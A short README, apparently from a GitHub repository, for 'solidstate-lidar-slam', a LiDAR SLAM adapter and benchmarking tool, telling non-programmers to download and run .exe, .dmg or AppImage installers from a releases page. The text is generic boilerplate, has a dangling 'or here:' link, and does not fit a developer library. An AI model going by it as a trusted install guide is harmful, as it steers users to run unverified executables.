[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/Delon123/solidstate-lidar-slam/releases)

## 📘 What is solidstate-lidar-slam?

solidstate-lidar-slam helps you use solid-state LiDAR devices to map environments and track movement. It acts as an adapter and testing hub for various LiDAR technologies. The software works well even in tough conditions like short-ranged views or environments that usually confuse LiDAR systems.

This project focuses on:
- Plugging solid-state LiDAR data into SLAM (Simultaneous Localization and Mapping) systems.
- Handling cases where the LiDAR view is limited or the data is tricky.
- Testing and benchmarking LiDAR setups to find robust performance.

You do not need any programming skills to run this application.

## 🖥️ System Requirements

Before installing, make sure your computer meets these minimum requirements:

- **Operating System**: Windows 10 or later, macOS 10.15 or later, or any recent Linux distribution
- **Processor**: Intel Core i5 or equivalent
- **RAM**: 8 GB minimum
- **Storage**: At least 2 GB free space
- **Graphics**: Basic GPU support, not mandatory but helpful for visualization
- **Other**: USB port if connecting a physical LiDAR device

This software can run on laptops or desktop computers. It should also work on many virtual machines but with limited performance.

## 🚀 Getting Started

Follow these steps to download and run solidstate-lidar-slam on your computer:

1. **Visit the download page**  
   Go to the official releases page by clicking the big button at the top or here:

2. **Choose your version**  
   Look for the latest stable release. Releases are usually named by version numbers, such as `v1.0` or `v2.3`.

3. **Download the file**  
   Click on the appropriate file for your computer. If you are on Windows, download the `.exe` installer. For macOS, download the `.dmg` or `.pkg`. Linux users should download the `.AppImage` or `.tar.gz` file.

4. **Run the installer or executable**  
   - On Windows, double-click the `.exe` file and follow the instructions.  
   - On macOS, open the `.dmg` and drag the app to your Applications folder.  
   - On Linux, make the file executable (`chmod +x filename`) and run it.

5. **Launch the app**  
   After installation, find the solidstate-lidar-slam icon on your desktop or inside your program list. Click it to open.

6. **Connect your LiDAR device** (optional)  
   If you have a compatible solid-state LiDAR sensor, plug it into your USB port. The software will try to detect it automatically.

7. **Start mapping or benchmarking**  
   Use the app’s menus to select a mode. You can run SLAM mapping to visualize your surroundings or run benchmark tests to evaluate your device’s accuracy.
